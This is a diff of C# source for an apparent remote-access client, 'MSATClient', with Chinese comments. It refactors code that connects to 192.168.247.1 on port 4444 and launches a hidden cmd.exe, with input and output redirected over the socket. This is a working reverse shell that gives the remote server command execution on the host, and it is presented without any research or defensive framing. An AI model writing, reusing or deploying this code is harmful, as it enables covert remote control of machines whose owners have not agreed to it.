@@ -20,37 +20,37 @@ namespace MSATClient
         {
             Console.WriteLine("Socket...");
             IPEndPoint serverIP = new IPEndPoint(IPAddress.Parse("192.168.247.1"), 4444);
+            Socket tcpClient = null;
+            //tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             GetMessage getMessage = null;
+            //System.Diagnostics.Process p = null;
             while (true)
             {
-                System.Diagnostics.Process p = new System.Diagnostics.Process();
+                /**p = null;
+                p = new System.Diagnostics.Process();
                 p.StartInfo.FileName = "cmd.exe";
                 p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
                 p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
                 p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
                 p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
                 p.StartInfo.CreateNoWindow = true;//不显示程序窗口
-                p.Start();//启动程序
+                p.Start();//启动程序**/
                 try
                 {
-                    Socket tcpClient = null;
                     tcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     tcpClient.Connect(serverIP);
                     Console.WriteLine("连接成功！");
-
-                    getMessage = null;
-                    getMessage = new GetMessage();
-                    getMessage.TcpClient(tcpClient,p);
-
+                    break;
                 }
                 catch(Exception ex)
                 {
                     Console.WriteLine("Socket连接失败或异常中断！EX："+ex.Message);
-                    
                 }
-                p.WaitForExit();//等待程序执行完退出进程
-                p.Close();
+                //p.WaitForExit();//等待程序执行完退出进程
+                //p.Close();
             }
+            getMessage = new GetMessage();
+            getMessage.TcpClient(tcpClient);
         }
     }
 
@@ -63,7 +63,7 @@ namespace MSATClient
         /// Tcp连接方式
         /// </summary>
         /// <param name="serverIP"></param>
-        public void TcpClient(Socket tcpClient, System.Diagnostics.Process p)
+        public void TcpClient(Socket tcpClient)
         //public void TcpClient(IPEndPoint serverIP)
         {
             //Socket tcpClient = null;
@@ -95,14 +95,14 @@ namespace MSATClient
                 Console.WriteLine("连接失败！请检查网络！");
                 //System.Environment.Exit(0);
             }
-            /**System.Diagnostics.Process p = new System.Diagnostics.Process();
+            System.Diagnostics.Process p = new System.Diagnostics.Process();
             p.StartInfo.FileName = "cmd.exe";
             p.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
             p.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
             p.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
             p.StartInfo.RedirectStandardError = true;//重定向标准错误输出
             p.StartInfo.CreateNoWindow = true;//不显示程序窗口
-            p.Start();//启动程序**/
+            p.Start();//启动程序
             //接收数据
             new Thread(() =>
             {
@@ -199,8 +199,8 @@ namespace MSATClient
                     catch (Exception ex)
                     {
                         Console.WriteLine("接收消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
-                        //p.WaitForExit();//等待程序执行完退出进程
-                        //p.Close();
+                        p.WaitForExit();//等待程序执行完退出进程
+                        p.Close();
                         break;
                         //System.Environment.Exit(0);
                     }
